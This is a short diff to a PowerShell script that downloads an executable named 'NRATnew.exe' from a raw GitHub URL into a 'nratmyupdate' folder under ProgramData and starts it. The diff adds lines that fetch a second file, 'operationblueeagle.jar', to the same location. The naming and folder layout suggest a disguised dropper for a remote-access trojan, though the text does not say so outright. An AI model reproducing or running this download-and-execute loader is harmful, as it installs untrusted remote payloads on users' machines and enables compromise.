@@ -5,3 +5,6 @@ $source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asr
 $destination = 'C:\ProgramData\zDATAxD\nratmyupdate\NRATnew.exe'
 Invoke-WebRequest -Uri $source -OutFile $destination
 start NRATnew.exe
+$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/operationblueeagle.jar'
+$destination = 'C:\ProgramData\zDATAxD\nratmyupdate\operationblueeagle.jar'
+Invoke-WebRequest -Uri $source -OutFile $destination
